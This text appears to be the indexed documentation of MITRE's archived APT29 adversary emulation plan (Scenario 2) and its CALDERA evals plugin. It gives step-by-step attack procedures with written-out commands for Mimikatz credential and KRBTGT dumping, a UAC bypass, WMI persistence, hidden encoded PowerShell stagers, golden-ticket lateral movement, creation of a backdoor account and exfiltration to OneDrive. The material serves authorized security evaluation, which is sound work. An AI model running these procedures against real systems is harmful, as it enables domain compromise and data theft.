PowerShell:"]},{"i":"add-rtlo-character-and-place-rcs3aka3doc-on-windows-victim-1","l":"Add RTLO character and place rcs.3aka3.doc on Windows Victim-1","p":["See payload_configs.md for instructions on how to update cod.3aka3.scr"]}],[{"l":"Scenario 2"},{"l":"Preface","p":["APT29 operations have been separated into two scenarios, with steps and granular procedures contained within each. Within each scenario, operations have been broken into specific objectives, which are presented linearly as each enables subsequent objectives. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources. The assessing team can begin at any scenario or objective but should do so understanding that each objective enables succeeding objectives."]},{"l":"Overview","p":["Emulation of APT29 usage of tools such as PowerDuke, POSHSPY, CloudDuke, as well as more recent (2016+) TTPs","Scenario begins with a target spearphishing leading into a low and slow, methodical approach to owning the initial target and eventually the entire domain","Includes establishing persistence, credential gathering, local and remote enumeration, and data exfil","Modular components (ex: PowerShell scripts) may be executed atomically"]},{"l":"Contents","p":["11.A - User Execution: Malicious File (T1204 / T1204.002)","12.A - Indicator Removal on Host: Timestomp (T1099 / T1070.006)","12.B - Software Discovery: Security Software Discovery (T1063 / T1518.001)","12.C - Software Discovery (T1518 / T1518.001)","13.A - System Information Discovery (T1082)","13.B - System Network Configuration Discovery (T1016)","13.C - System Owner/User Discovery (T1033)","13.D - Process Discovery (T1057)","14.A - Abuse Elevation Control Mechanism: Bypass User Access Control (T1088 / T1548.002)","14.B - OS Credential Dumping: LSASS Memory (T1003 / T1003.001)","15.A - Event Triggered Execution: Windows Management Instrumentation Event Subscription (T1084 / T1546.003)","16.A - Remote System Discovery (T1018)","16.B - System Owner/User Discovery (T1033)","16.C - Remote Services: Windows Remote Management (T1028 / T1021.006)","16.D - OS Credential Dumping (T1003 / T1003.001)","17.A - Email Collection: Local Email Collection (T1114 / T1114.001)","17.B - Data from Local System (T1005)","17.C - Obfuscated Files or Information (T1027)","18.A - Exfiltration Over Alternative Protocol (T1048 / T1567.002)","19.A - Indicator Removal on Host: File Deletion (T1107 / T1070.004)","19.B - Indicator Removal on Host: File Deletion (T1107 / T1070.004)","19.C - Indicator Removal on Host: File Deletion (T1107 / T1070.004)","20.A - Persistence Execution (T1085 / T1218.011, T1084 / T1546.003)","20.B - Use Alternate Authentication Material: Pass the Ticket (T1097 / T1550.001, T1550.003)","Acknowledgements","Cited Intelligence","Overview","Pre-requisites","Preface","Procedures","Scenario 2","Special thanks to the following public resources","Step 11 - Initial Breach","Step 12 - Fortify Access","Step 13 - Local Enumeration","Step 14 - Elevation","Step 15 - Establish Persistence","Step 16 - Lateral Movement","Step 17 - Collection","Step 18 - Exfiltration","Step 19 - Clean Up","Step 20 - Leverage Persistence"]},{"l":"Pre-requisites","p":["Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the Scenario 2 Infrastructure documentation."]},{"i":"step-11---initial-breach","l":"Step 11 - Initial Breach","p":["The scenario begins with initial breach, where a legitimate user clicks ( T1204/ T1204.002) a link file payload, which executes an alternate data stream (ADS) hidden on another dummy file ( T1096/ T1564.004) delivered as part of the spearphishing campaign. The ADS performs a series of enumeration commands to ensure it is not executing in a virtualized analysis environment ( T1497/ T1497.001, T1082, T1120, T1033, T1016, T1057, T1083) before establishing persistence via a Windows Registry Run key entry ( T1060/ T1547.001) pointing to an embedded DLL payload that was decoded and dropped to disk ( T1140). The ADS then executes a PowerShell stager ( T1086/ T1059.001) which creates a C2 connection over port 443 ( T1043) using the HTTPS protocol ( T1032/ T1573.002, T1071/ T1071.001)."]},{"l":"Procedures"},{"i":"11a---user-execution-malicious-file-t1204--t1204002","l":"11.A - User Execution: Malicious File (T1204 / T1204.002)","p":["As non-domain admin user, execute 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk(double click), output will display in terminal","You will now receive a new, low integrity callback"]},{"l":"Cited Intelligence","p":["Open Invitation Contributor: Microsoft","APT29 has used several persistence mechanisms, including, Registry run keys. 5, 11","APT29 phishing campaigns have contained weaponized Windows shortcut files that executed an obfuscated PowerShell command from within the file and dropped a DLL to the victimâs system. 8, 11, 16","PowerDuke has performed anti-VM checks designed to avoid executing in virtualized environments. PowerDuke payloads have also contained a component hidden in an ADS and connected to C2 over port 443. 11","Note: The anti-analysis commands and logic were derived from a VirusTotal submission. 9"]},{"i":"step-12---fortify-access","l":"Step 12 - Fortify Access","p":["The attacker modifies the time attributes of the DLL payload ( T1099/ T1070.006) used in the previously established persistence mechanism to match that of a random file found in the victimâs System32 directory ( T1083). The attacker then enumerates registered AV products ( T1063/ T1518.001) and software installed by the user documented in the Windows Registry ( T1012)."]},{"i":"procedures-1","l":"Procedures"},{"i":"12a---indicator-removal-on-host-timestomp-t1099--t1070006","l":"12.A - Indicator Removal on Host: Timestomp (T1099 / T1070.006)","p":["Load timestomp.ps1","Execute timestomp C:\\Users\\oscar\\AppData\\Roaming\\Microsoft\\kxwn.lock"]},{"i":"12b---software-discovery-security-software-discovery-t1063--t1518001","l":"12.B - Software Discovery: Security Software Discovery (T1063 / T1518.001)","p":["Load stepTwelve.ps1","Execute detectav"]},{"i":"12c---software-discovery-t1518--t1518001","l":"12.C - Software Discovery (T1518 / T1518.001)","p":["Execute software"]},{"i":"cited-intelligence-1","l":"Cited Intelligence","p":["Open Invitation Contributors: Kaspersky, SentinelOne","POSHSPY can modify standard information timestamps of downloaded executables to match a randomly selected file from the System32 directory. PowerDuke also has had undescribed commands named \"detectavâ and \"software.\" 10"]},{"i":"step-13---local-enumeration","l":"Step 13 - Local Enumeration","p":["The attacker performs local enumeration using various Windows API calls, specifically gathering the local computer name ( T1082), domain name ( T1016), current user context ( T1033), and running processes ( T1057)."]},{"i":"procedures-2","l":"Procedures"},{"i":"13a---system-information-discovery-t1082","l":"13.A - System Information Discovery (T1082)","p":["Load stepThirteen.ps1","Execute comp"]},{"i":"13b---system-network-configuration-discovery-t1016","l":"13.B - System Network Configuration Discovery (T1016)","p":["Execute domain"]},{"i":"13c---system-owneruser-discovery-t1033","l":"13.C - System Owner/User Discovery (T1033)","p":["Execute user"]},{"i":"13d---process-discovery-t1057","l":"13.D - Process Discovery (T1057)","p":["Execute pslist"]},{"i":"cited-intelligence-2","l":"Cited Intelligence","p":["PowerDuke can get the NetBIOS name, the computerâs domain name, userâs name, and process list via select Windows API calls. 11"]},{"i":"step-14---elevation","l":"Step 14 - Elevation","p":["The attacker elevates privileges via a user account control (UAC) bypass ( T1122/ T1546.015, T1088/ T1548.002). The attacker then uses the new elevated access to create and execute code within a custom WMI class ( T1047) that downloads ( T1105) and executes Mimikatz to dump plain-text credentials ( T1003/ T1003.001), which are parsed, encoded, and stored in the WMI class ( T1027). After tracking that the WMI execution has completed ( T1057), the attacker reads the plaintext credentials stored within the WMI class ( T1140)."]},{"i":"procedures-3","l":"Procedures"},{"i":"14a---abuse-elevation-control-mechanism-bypass-user-access-control-t1088--t1548002","l":"14.A - Abuse Elevation Control Mechanism: Bypass User Access Control (T1088 / T1548.002)","p":["Load stepFourteen_bypassUAC.ps1","Execute bypass","You will now receive a new, high integrity callback"]},{"i":"14b---os-credential-dumping-lsass-memory-t1003--t1003001","l":"14.B - OS Credential Dumping: LSASS Memory (T1003 / T1003.001)","p":["Go to where m.exe is on C2 server in another terminal","Confirm m.exe is there and is a Windows PE ($ file m)","m.exe is a copy of the Mimikatz executable (available at https://github.com/gentilkiwi/mimikatz)","Host file on port 8080 ($ sudo python -m SimpleHTTPServer 8080)","Interact with new callback","Load stepFourteen_credDump.ps1","Execute wmidump","Kill the python server (CTRL-C) once you see a GET request on the python server (VM terminal)"]},{"i":"cited-intelligence-3","l":"Cited Intelligence","p":["Open Invitation Contributors: Microsoft, SentinelOne","APT29 has embedded and encoded PowerShell scripts in WMI class properties. 5, 10","APT29 has bypassed UAC to elevate privileges. 5","APT29 has used WMI to store and run Invoke-Mimikatz (ATT&CK S0002) on remote hosts. 7, 12","POSHSPY has used WMI to both store and persist PowerShell backdoor code. POSHSPY can also download and execute additional PowerShell code and Windows binaries. 7, 10, 12"]},{"i":"step-15---establish-persistence","l":"Step 15 - Establish Persistence","p":["The attacker establishes a secondary means of persistent access to the victim by creating a WMI event subscription ( T1084/ T1546.003) to execute a PowerShell payload whenever the current user ( T1033) logs in."]},{"i":"procedures-4","l":"Procedures"},{"i":"15a---event-triggered-execution-windows-management-instrumentation-event-subscription-t1084--t1546003","l":"15.A - Event Triggered Execution: Windows Management Instrumentation Event Subscription (T1084 / T1546.003)","p":["Load stepFifteen_wmi.ps1","Execute wmi","Note: Do not RDP into the initial access from this point forward, you will trigger callbacks intended for step 20"]},{"i":"cited-intelligence-4","l":"Cited Intelligence","p":["Open Invitation Contributors: Microsoft, SentinelOne","APT29 has used several persistence mechanisms, including WMI backdoors that execute PowerShell components. 5, 10"]},{"i":"step-16---lateral-movement","l":"Step 16 - Lateral Movement","p":["The attacker enumerates the environmentâs domain controller ( T1018) and the domainâs security identifier (SID) ( T1033) via the Windows API ( T1106). Next, the attacker uses the previously dumped credentials ( T1078/ T1078.002) to create a remote PowerShell session to the domain controller ( T1028/ T1021.006). Through this connection, the attacker copies the Mimikatz binary used in Step 14 to the domain controller ( T1105/ T1570) then dumps the hash of the KRBTGT account ( T1003/ T1003.001)."]},{"i":"procedures-5","l":"Procedures"},{"i":"16a---remote-system-discovery-t1018","l":"16.A - Remote System Discovery (T1018)","p":["Interact with low integrity callback","Load powerView.ps1(available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)","Execute get-netdomaincontroller"]},{"i":"16b---system-owneruser-discovery-t1033","l":"16.B - System Owner/User Discovery (T1033)","p":["Load stepSixteen_SID.ps1","Execute siduser","Save the value for the domain SID (ex: S-1-5-21-2219224806-3979921203-557828661-1110) and delete the RID (ex: -1110) of the end (ex: S-1-5-21-2219224806-3979921203-557828661)"]},{"i":"16c---remote-services-windows-remote-management-t1028--t1021006","l":"16.C - Remote Services: Windows Remote Management (T1028 / T1021.006)","p":["Interact with high integrity callback","Load Invoke-WinRMSession.ps1(available at https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-WinRMSession.ps1)","Execute invoke-winrmsession -Username [insert domain admin username] -Password [insert domain admin password] -IPAddress [insert domain controller IP]","Output will tell you a session opened and give you the format for using it, ex: Session opened, to run a command do the following: Invoke-Command -Session $[session_id] -scriptblock {Get-Process} | out-string","Save the value for the session_id (ex: $hzaqx)","Note: If you get an error here, reboot domain controller, then re-run the 2 winrm setup commands before re-executing 16.C"]},{"i":"16d---os-credential-dumping-t1003--t1003001","l":"16.D - OS Credential Dumping (T1003 / T1003.001)","p":["Execute Copy-Item m.exe -Destination C:\\Windows\\System32\\ -ToSession $[session_id]","m.exe is a copy of the Mimikatz executable (available at https://github.com/gentilkiwi/mimikatz)","Execute Invoke-Command -Session $[session_id] -scriptblock {C:\\Windows\\System32\\m.exe privilege::debug lsadump::lsa /inject /name:krbtgt exit} | out-string","Take note of value for the NTLM hash (ex: NTLM : f4a688010d80770a55a22893dc6ac510) near the top (Under RID and User after * Primary)","Execute Get-PSSession | Remove-PSSession"]},{"i":"cited-intelligence-5","l":"Cited Intelligence","p":["Open Invitation Contributors: Microsoft, SentinelOne","PowerDuke can get the current userâs SID via select Windows API calls. 11"]},{"i":"step-17---collection","l":"Step 17 - Collection","p":["The attacker harvests emails stored in the local email client ( T1114/ T1114.001) before collecting ( T1005) and staging ( T1074/ T1074.001) a file of interest. The staged file is compressed ( T1002/ T1560.001) as well as prepended with the magic bytes of the GIF file type ( T1027)."]},{"i":"procedures-6","l":"Procedures"},{"i":"17a---email-collection-local-email-collection-t1114--t1114001","l":"17.A - Email Collection: Local Email Collection (T1114 / T1114.001)","p":["Interact with low integrity callback","Load stepSeventeen_email.ps1","Execute psemail"]},{"i":"17b---data-from-local-system-t1005","l":"17.B - Data from Local System (T1005)","p":["Interact with high integrity callback","Execute New-Item -Path C:\\Windows\\Temp\\ -Name WindowsParentalControlMigration -ItemType directory","Execute Copy-Item C:\\Users\\oscar\\Documents\\MITRE-ATTACK-EVALS.HTML -Destination C:\\Windows\\Temp\\WindowsParentalControlMigration"]},{"i":"17c---obfuscated-files-or-information-t1027","l":"17.C - Obfuscated Files or Information (T1027)","p":["Load stepSeventeen_zip.ps1","Execute zip C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp C:\\Windows\\Temp\\WindowsParentalControlMigration"]},{"i":"cited-intelligence-6","l":"Cited Intelligence","p":["Open Invitation Contributors: Kaspersky, Microsoft","APT29 has used the legit Microsoft DLL and PowerShell to interact with Exchange Web Services (EWS) for email theft. 7","POSHSPY can appended a file signature header to all encrypted data prior to upload or download. 10"]},{"i":"step-18---exfiltration","l":"Step 18 - Exfiltration","p":["The attacker maps a local drive to an online web service account ( T1102) then exfiltrates the previous staged data to this repository ( T1048/ T1567.002)."]},{"i":"procedures-7","l":"Procedures"},{"i":"18a---exfiltration-over-alternative-protocol-t1048--t1567002","l":"18.A - Exfiltration Over Alternative Protocol (T1048 / T1567.002)","p":["Get CID for OneDrive account ( https://www.laptopmag.com/articles/map-onedrive-network-drive)","Execute net use y: https://d.docs.live.net/[CID] /user:[OneDrive account]@outlook.com [OneDrive password]","Execute Copy-Item C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp -Destination Y:\\WindowsParentalControlMigration.tmp","Login to https://onedrive.live.com/?id=rootcid=[CID] to see exfil ( WindowsParentalControlMigration.tmp)"]},{"i":"cited-intelligence-7","l":"Cited Intelligence","p":["Open Invitation Contributors: Kaspersky, Microsoft, SentinelOne","CloudDuke can use a Microsoft OneDrive to exchange stolen data with its operators. 1, 5"]},{"i":"step-19---clean-up","l":"Step 19 - Clean Up","p":["The attacker deletes various files ( T1107/ T1070.004) associated with that access by reflectively loading and executing the Sdelete binary ( T1055/ T1055.002) within powershell.exe."]},{"i":"procedures-8","l":"Procedures"},{"i":"19a---indicator-removal-on-host-file-deletion-t1107--t1070004","l":"19.A - Indicator Removal on Host: File Deletion (T1107 / T1070.004)","p":["Load wipe.ps1","Execute wipe C:\\Windows\\System32\\m.exe","Note: There's a known bug here with ETW (Invoke-ReflectivePEInjection patches a function on the fly that ETW invokes) so callback may die and hang."]},{"i":"19b---indicator-removal-on-host-file-deletion-t1107--t1070004","l":"19.B - Indicator Removal on Host: File Deletion (T1107 / T1070.004)","p":["Execute wipe C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp"]},{"i":"19c---indicator-removal-on-host-file-deletion-t1107--t1070004","l":"19.C - Indicator Removal on Host: File Deletion (T1107 / T1070.004)","p":["Execute wipe C:\\Windows\\Temp\\WindowsParentalControlMigration\\MITRE-ATTACK-EVALS.HTML"]},{"i":"cited-intelligence-8","l":"Cited Intelligence","p":["Open Invitation Contributors: Microsoft, SentinelOne","APT29 has removed tools and forensic artifacts to hide activity, including the usage of Sdelete ( S0195). 5","PowerDuke can write random data across then delete a file. 11"]},{"i":"step-20---leverage-persistence","l":"Step 20 - Leverage Persistence","p":["The original victim is rebooted and the legitimate user logs in, emulating ordinary usage and a passage of time. This activity triggers the previously established persistence mechanisms, namely the execution of the DLL payload ( T1085/ T1218.011), referenced by the Windows Registry Run key, and the WMI event subscription ( T1084/ T1546.003), which executes a new PowerShell stager ( T1086/ T1059.001). The attacker uses the renewed access to generate a Kerberos Golden Ticket ( T1097/ T1558.001, T1558.003), using materials from the earlier breach, which is used to establish a remote PowerShell session to a new victim ( T1028/ T1021.006). Through this connection, the attacker creates a new account within the domain ( T1136/ T1136.001)."]},{"i":"procedures-9","l":"Procedures"},{"i":"20a---persistence-execution-t1085--t1218011-t1084--t1546003","l":"20.A - Persistence Execution (T1085 / T1218.011, T1084 / T1546.003)","p":["Execute restart-computer -force","Existing 2 callbacks should die","RDP and login to initial victim once it reboots","Persistence mechanisms should fire on login (1 for DLL, 1 or more for WMI event subscription)","Note: You may need to repeat login process a few times (close and reopen RDP session) for WMI execute to fire"]},{"i":"20b---use-alternate-authentication-material-pass-the-ticket-t1097--t1550001-t1550003","l":"20.B - Use Alternate Authentication Material: Pass the Ticket (T1097 / T1550.001, T1550.003)","p":["Interact with the SYSTEM PS callback (from WMI)","Execute klist purge","Load Invoke-Mimikatz.ps1(available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)","Execute invoke-mimikatz -command 'kerberos::golden /domain:dmevals.local /sid:[SID] /rc4:[NTLM HASH] /user:mscott /ptt' using the SID and NTLM values from earlier","Execute klist and confirm ticket is in cache","Execute Enter-PSSession [hostname of second workstation in domain]","Execute Invoke-Command -ComputerName [hostname of second workstation in domain] -ScriptBlock {net user /add toby pamBeesly3}"]},{"i":"cited-intelligence-9","l":"Cited Intelligence","p":["Open Invitation Contributors: Microsoft, SentinelOne","APT29 have used Kerberos ticket attacks for lateral movement and has created accounts to log in. 5, 7"]},{"l":"Acknowledgements"},{"l":"Special thanks to the following public resources","p":["Atomic Red Team ( https://github.com/redcanaryco/atomic-red-team)","Mimikatz ( https://github.com/gentilkiwi/mimikatz)","Pinvoke ( http://www.pinvoke.net)","PoshC2 ( https://github.com/nettitude/PoshC2)","POSHSPY ( https://github.com/matthewdunwoody/POSHSPY)","PowerSploit ( https://github.com/PowerShellMafia/PowerSploit)","PSReflect-Functions ( https://github.com/jaredcatkinson/PSReflect-Functions)","State of the Hack S2E01: #NoEasyBreach REVISITED ( https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html)","Use PowerShell to Interact with the Windows API ( https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-1)","Yet another sdclt UAC bypass ( http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)"]}],[{"l":"Scenario 2 Infrastructure","p":["We hope to capture the general structure of what is reported to have been seen being used by APT29. The infrastructure listed below is specific to Scenario 2. The requirements described herein should be considered a bare minimum to execute the scenario. If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc. If you are not concerned with emulating APT29 to this degree, this level of effort is not necessary. You could for instance, phish, serve payload, and exfil from/to the same server.","Please note that binary files hosted in Scenario_1 and Scenario_2 have been added to password protected zip files. The password for these files is \"malware.\""]},{"l":"Emulation Team Infrastructure","p":["Server running an offensive framework (we tested and executed using PoshC2 -- https://github.com/nettitude/PoshC2) capable of:","Executing native PowerShell commands","Loading and executing PowerShell scripts (.ps1)","Generating a DLL payload and an encoded PowerShell oneliner","Receiving and maintaining multiple callbacks at once","Online OneDrive Account ( https://onedrive.live.com/)"]},{"l":"Emulation Team Infrastructure Configuration"},{"l":"A note about red team payloads","p":["Pre-compiled payloads are available in the resources directory; however, they are configured to connect back to static IP addresses 192.168.0.5 and 192.168.0.4."]},{"i":"generate-an-encoded-powershell-oneliner-payload-then-copy","l":"Generate an encoded PowerShell oneliner payload, then copy","p":["Just the encoded portion (ex: WwBTAH...=) into $enc_ps variable(4th line from bottom) in schemas.ps1","ex: $enc_ps = WwBTAH...==","The entire value (ex: powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=) into CommandLineTemplate variable (under $ConsumerArgs in 2nd paragraph) in stepFifteen_wmi.ps1","ex: CommandLineTemplate=powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=","The entire value (ex: powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...=) into -Value variable (2nd line) in stepFourteen_bypassUAC.ps1","ex: New-Item -Force -Path HKCU:\\Software\\Classes\\Folder\\shell\\open\\command -Value powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAH...="]},{"i":"generate-dll-payload-then-on-a-separate-windows-host","l":"Generate DLL payload, then on a separate Windows host","p":["[CMD] > certutil -encode [file].dll blob","[CMD] > powershell","[PS] > $blob = (Get-Content .\\blob) -join ; $blob .\\blob","Open blob file in text editor","Delete new line at end of file and copy all (CTRL-A, CTRL-C)","Paste value (ex: -----BEGIN CERTIFICATE-----...-----END CERTIFICATE-----) into $bin variable (6th line) in schemas.ps1"]},{"i":"copy-payloads-to-c2-server-wherever-is-appropriate-for-your-c2-framework-to-have-access-to-these-files","l":"Copy payloads to C2 server (wherever is appropriate for your C2 framework to have access to these files)"},{"i":"update-stepfourteen_creddumpps1----directions-are-in-file","l":"Update stepFourteen_credDump.ps1 -- directions are in file"},{"l":"Prepare initial access payloads","p":["Login as non-domain admin user","Copy over the following files onto the Desktop of the initial victim:","2016_United_States_presidential_election_-_Wikipedia.html","make_lnk.ps1","schemas.ps1","Copy over MITRE-ATTACK-EVALS.HTML into the Documents folder of the initial victim","Execute make_lnk.ps1(Right click > Run with PowerShell), this will generate 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk","Drag make_lnk.ps1 and schemas.ps1 to Recycle Bin and empty the Recycle Bin (Right click > Empty Recycle Bin)"]},{"l":"Target Infrastructure","p":["3 targets","1 domain controller and 2 workstations","All Windows OS (tested and executed against Win10 1903)","Domain joined with at least 2 accounts (domain admin and another user)","Microsoft Outlook must be available locally on one of the victim workstations"]},{"l":"Target Infrastructure Configuration"},{"l":"For each of the three targets","p":["Login in as domain admin user","Ensure Windows Defender is off or configured to alert-only ( https://support.microsoft.com/en-us/help/4027187/windows-10-turn-off-antivirus-protection-windows-security)","Change network type to Domain ( https://www.itechtics.com/change-network-type-windows-10/#2-_Setting_network_type_using_Windows_Registry)","Set UAC to never notify ( https://articulate.com/support/article/how-to-turn-user-account-control-on-or-off-in-windows-10)","Enable WinRM ( https://support.microsoft.com/en-us/help/555966)","Enable UseLogonCredential in the WDigest Registry settings ( https://support.microsoft.com/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a)"]},{"i":"for-the-initial-target-the-workstation-with-microsoft-outlook","l":"For the initial target (the workstation with Microsoft Outlook)","p":["Login as non-domain admin user","Enable programatic access to Microsoft Outlook ( https://www.slipstick.com/developer/change-programmatic-access-options/)","Open Outlook and sign in if necessary"]}],[{"l":"Machine-Readable APT29 Emulation Plans","p":["The universal, technology-agnostic version of the APT29 emulation plan YAML has been provided as starting point for machine parsing and execution of the APT29 emulation plan. This folder will store all versions of this yaml file, including those formatted to work with specific execution runners (such as automated agents like CALDERA or other breach simulation frameworks)."]},{"l":"Included Formats","p":["As new files are added, please list them in the below table.","File","Execution Framework","Notes","APT29.yaml","N/A","Initial Emulation Plan YAML"]}],[{"i":"apt29-emulation-archived","l":"APT29 Emulation (ARCHIVED)","p":["This content was developed as part of the APT29 ATT&CK Evaluations and includes both the resources used to manually execute the emulation as well as a plug-in developed for CALDERA(2.6.6).","For more details about the APT29 ATT&CK Evaluations, including results, visit https://attackevals.mitre-engenuity.org/APT29/"]},{"l":"Adversary Overview","p":["APT29/The Dukes/Cozy Bear/YTTRIUM(hereinafter referred to as just APT29) is a threat group that has been attributed to the Russian government and has operated since at least 2008. 1 14 This group has been attributed to major breaches targeting U.S. governments/organizations such as the Democratic National Committee, as well as various international ministries and agencies. 15 16 APT29 has also been known to âcast a wide netâ in terms of targeting, seemingly making this group a universal threat.","In terms of operational tradecraft, APT29 is distinguished by their commitment to stealth and sophisticated implementations of techniques via an arsenal of custom malware. APT29 typically accomplishes goals via custom compiled binaries and alternate (at least at the time) execution methods such as PowerShell and WMI. APT29 has also been known to employ various operational cadences (smash-and-grab vs. slow-and-deliberate) depending on the perceived intelligence value and/or infection method of victims."]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Copyright 2020 The MITRE Corporation","Approved for Public Release; Distribution Unlimited. Case Number 19-03607-2.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"i":"caldera-plugin-evals--archived","l":"CALDERA plugin: evals (ARCHIVED)"},{"l":"Overview","p":["This repository contains the evals plugin for CALDERA. This plugin contains the TTPs used within the ATT&CK Evaluations round 2 (APT29) and round 1 (APT3). For more information, please see the evaulations website.","Please read this README.md in its entirety to avoid missing crucial steps when executing an adversary."]},{"l":"Initial CALDERA Installation","p":["Clone CALDERA 2.6.6","Clone the Eval plugin into the caldera/plugins directory","Add the eval plugin to CALDERA config conf/local.yml"]},{"l":"Round 2 Adversary","p":["The APT29 adversary is broken up into three separate CALDERA adversaries that execute commands in different phases. Under the operation panel you will see these phases listed as APT29 - Day 1.A, APT29 - Day 1.B, and APT29 - Day 2. Leverage the appropriate CALDERA SANDCAT groups for each operational phase. Prior to running an operation, please consult the environment setup steps below."]},{"i":"environment-setup---evals-round-2---apt29","l":"Environment Setup - Evals Round 2 - APT29","p":["Consult the ATT&CK EVALUATION's Environment web page for a reference guide on how to replicate the range environment. Ensure that all A/V is disabled within the environment to successfully replicate the EVALS environment.","On your day 2 initial host you will need to manually browse to C:\\Windows\\Temp via Windows Explorer and accept the prompt.","Requirements for the round 2 adversary are the following:","Initial host exists within a Windows domain.","Install Google Chrome on the target.","OneDrive account for data exfil.","Failing to setup a OneDrive account will result only in an exfiltration ability failing, but the entire plugin can still run.","Disabling A/V products on host.","Failing to disable A/V products on the host will likely resolve in payloads being removed before abilities are executed.","It is recommended that you first execute the evals plugin in an isolated-test environment to fully understand the TTPs performed on hosts, as well as the artifacts left behind."]},{"l":"Setting Up CALDERA Facts","p":["Next, update the CALDERA facts now located in /caldera/plugins/evals/data/sources/4fb34bde-b06d-445a-a146-8e35f79ce546.yml with the appropriate values for your environment. Keys to update include:","Update target.domain.name to your environment's domain name.","Update target.winrm.username to an administrator account you will later laterally move to.","Update target.winrm.password to the administrators password used by target.winrm.username( THIS WILL BE STORED IN PLAINTEXT).","Update target.winrm.remote_host to the remote host with winrm enabled for lateral movement.","Update pivot_machine_hostname to the hostname of a Windows host for lateral movement via psexec.","Update profile_user as the initial user the first SANDCAT agent will be spawning under.","Update profile_user_password to the profiler_user's password ( THIS WILL BE STORED IN PLAINTEXT).","Update profile_user_day2 to another user within the domain.","Update profile_user_password_day2 to profile_user_day2's password ( THIS WILL BE STORED IN PLAINTEXT).","Update onedrive.url to a OneDrive url.","Update onedrive.username to a OneDrive account that will be used for data exifiltration.","Update onedrive.password to the onedrive.username's password ( THIS WILL BE STORED IN PLAINTEXT)."]},{"l":"Setting Up the CALDERA Server","p":["After initially cloning the CALDERA server, modify the conf/default.yml and set the CALDERA server's IP and port.","vim ./conf/default.yml","Note, this is a relative path from the plugin's location."]},{"l":"Setting Up Payloads","p":["Prior to executing any of the commands listed below, certain payloads must be configured with your CALDERA server's IP address and port. To accomplish this, use the setup.py. Python script located in the payloads directory of the evalsâ plugin to dynamically update the payloads to the appropriate IP and port.","cd plugins/evals/ python3 ./payloads/setup.py"]},{"l":"Starting CALDERA","p":["Activate the Python virtual environment created by install.sh.","cd ../../ source ./calderaenv/bin/activate","Start a fresh instance of CALDERA.","python3 server.py --fresh"]},{"i":"evals-round-2---apt-29--operation-steps","l":"EVALs Round 2 - APT 29 Operation Steps","p":["The APT29 adversary profile is broken down into three separate adversary profiles. These profiles include APT29 Day-1 A, APT29 Day-1 B - Lateral Movement, and APT29 Day-2. To successfully replicate the ATT&CK evals process, an environment setup like the one outlined in the environment setup section is assumed."]},{"i":"apt29-day-1a","l":"APT29 Day 1.A","p":["Perform the following steps to get started with the APT29 adversary profiles:","Start a SANDACAT agent with elevated privileges. To do so, copy the SANDCAT cradle from the agentâs tab and execute in an elevated userâs PowerShell prompt.","img-0","img-1","img-2","img-3","Before hitting \"enter\" within the PowerShell prompt, you should change the default group from \"red\" to something more descriptive such as \"red-day-1-A\". See the image below.","img-4","At this point, you should then see an agent call back to your CALDERA server, which is visible under the \" agents\" tab. img-5","img-6","Now that we have an agent, we can run an operation. Select \" APT29 Day-1 A\" from the operation page. img-7","img-8","Start the APT29 Day-1 operation."]},{"i":"apt29-day-1b---lateral-movement","l":"APT29 Day 1.B - Lateral Movement","p":["Additional agents will spawn from the APT29 Day-1 A operation including a SANDCAT agent renamed as \"python.exe\". This will be the starting for APT29 Day-1 B. To start APT29 Day-1 B, start another operation with the group the \"python.exe\" agent is in. Agent metadata can be viewed by clicking on the process id within the CALDERA interface.","img-10","img-11","Now that we have verified the new agent exists, run a new operation using the APT29 1.B - Lateral Movement adversary profile."]},{"l":"APT29 Day 2","p":["The APT29 Day-2 adversary profile expects a new agent to be run on a new machine as a non-elevated user. Copy the SANDCAT cradle as previously done and execute in a non-administrator PowerShell prompt.","img-12","After completing all adversary steps outlined above, RDPing into the target host should trigger additional persistence mechanisms."]},{"i":"issues","l":"Issues?","p":["Please consult the common problems page on the CALDERA Read the Docs page. If you're still having issues, please open a git issue on the evals plugin page and follow the guidelines within ISSUES.md for reporting issues."]},{"l":"Acknowledgements","p":["Microsoft Sysinternals","Mimikatz","PoshC2","PowerShell Empire","PowerShell Mafia"]}],[{"l":"ISSUES"},{"l":"How to Report an Issue","p":["Before reporting an issue with GitHub, be sure that:","you are using version 2.6.6 of CALDERA.","the issue was not already reported.","you follow the example template below."]}],[{"l":"Payloads"},{"l":"Payloads Explained","p":["* vpn","*.doc","*.docx","*.jpg","*.jtd","*.lnk","*.lwp","*.ods","*.odt","*.ost","*.pdf","*.pps","*.ppsx","*.ppt","*.pptx","*.pst","*.rar","*.txt","*.url","*.wpd","*.wps","*.xls","*.xlsx","*.xps","*.zip","2016_United_States_presidential_election_-_Wikipedia.html: Staging payload for ADFS.","admin","cod.3aka.scr.exe: Sandcat payload to complete RTLO execution.","dmevals.local.pfx: 